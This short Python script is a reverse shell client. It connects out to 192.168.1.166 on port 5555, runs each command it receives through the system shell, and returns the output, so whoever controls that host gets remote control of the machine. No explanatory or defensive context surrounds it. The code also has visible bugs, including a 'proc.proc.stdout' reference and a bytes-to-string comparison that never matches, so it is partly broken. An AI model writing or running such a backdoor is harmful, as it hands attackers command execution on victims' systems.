from socket import *
import socket
import subprocess

host = '192.168.1.166'
port = 5555
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

while True:
    data = s.recv(1024)
    if data == ':q':
        break

    proc = subprocess.Popen(data, shell = True, stdout = subprocess.PIPE, \
    stderr = subprocess.PIPE, stdin=subprocess.PIPE)
    output = proc.proc.stdout.read() + proc.stderr.read()
    s.send(output)

s.close()